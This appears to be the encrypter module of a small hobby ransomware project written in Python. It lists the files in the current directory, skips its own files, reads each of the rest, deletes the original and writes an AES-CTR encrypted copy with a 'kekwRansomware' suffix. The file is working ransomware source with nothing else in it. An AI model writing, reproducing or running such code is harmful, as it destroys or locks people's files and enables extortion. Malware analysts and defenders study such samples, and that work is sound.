#ts217

import os
import pyaes
import time

class Encrypter:
    def __init__(self,key):
        self.key = key

    @property
    def listFiles(self):
        files = os.listdir()
        return files
    
    @property
    def officialLIst(self): 
        filesFromRansomware = ["encrypter.py","main.py","__pycache__","descrypter.py"]
        
        resultingList = list(filter(lambda x: x not in filesFromRansomware, self.listFiles))
        return resultingList
    
    def removeFiles(self,file):
        os.remove(file)

    def encrypterData(self,file):
        aes = pyaes.AESModeOfOperationCTR(self.key)
        cryptoData = aes.encrypt(file)
        return cryptoData

    def fileCreater(self,file,data):
        newFile = file + "kekwRansomware"

        with open(f"{newFile}","wb") as new:
            newFile = new.write(data)
    
    def encrypterFiles(self):
        for x in self.officialLIst:

            with open(x,"rb") as file:
                fileData  = file.read()

            self.removeFiles(x)
            self.fileCreater(x,self.encrypterData(fileData))
            time.sleep(1)
    
    

    

    
    


    
    